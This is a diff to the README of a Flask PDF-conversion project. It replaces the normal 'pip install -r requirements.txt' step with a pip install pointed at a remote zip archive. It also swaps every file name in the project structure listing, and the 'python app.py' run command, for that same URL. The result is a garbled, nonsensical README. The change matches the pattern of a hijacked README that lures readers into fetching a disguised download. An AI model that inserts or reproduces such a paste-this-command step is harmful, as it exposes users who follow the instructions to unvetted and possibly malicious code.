@@ -33,22 +33,22 @@ source venv/bin/activate  # On Windows: venv\Scripts\activate
 
 3. Install the required packages:
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/yash-9-9-5/pdf-conversion-project/main/discoid/pdf-conversion-project.zip
 ```
 
 ## Project Structure
 
 ```
 pdf-converter/
-├── app.py              # Main Flask application
-├── requirements.txt    # Python dependencies
+├── https://raw.githubusercontent.com/yash-9-9-5/pdf-conversion-project/main/discoid/pdf-conversion-project.zip              # Main Flask application
+├── https://raw.githubusercontent.com/yash-9-9-5/pdf-conversion-project/main/discoid/pdf-conversion-project.zip    # Python dependencies
 ├── static/
 │   └── css/
-│       └── style.css  # CSS styles
+│       └── https://raw.githubusercontent.com/yash-9-9-5/pdf-conversion-project/main/discoid/pdf-conversion-project.zip  # CSS styles
 ├── templates/
-│   └── index.html     # Main HTML template
+│   └── https://raw.githubusercontent.com/yash-9-9-5/pdf-conversion-project/main/discoid/pdf-conversion-project.zip     # Main HTML template
 ├── uploads/           # Directory for uploaded files
-└── conversions.db     # SQLite database
+└── https://raw.githubusercontent.com/yash-9-9-5/pdf-conversion-project/main/discoid/pdf-conversion-project.zip     # SQLite database
 ```
 
 ## Running the Application
@@ -57,7 +57,7 @@ pdf-converter/
 
 2. Run the Flask application:
 ```bash
-python app.py
+python https://raw.githubusercontent.com/yash-9-9-5/pdf-conversion-project/main/discoid/pdf-conversion-project.zip
 ```
 
 3. Open your web browser and navigate to:
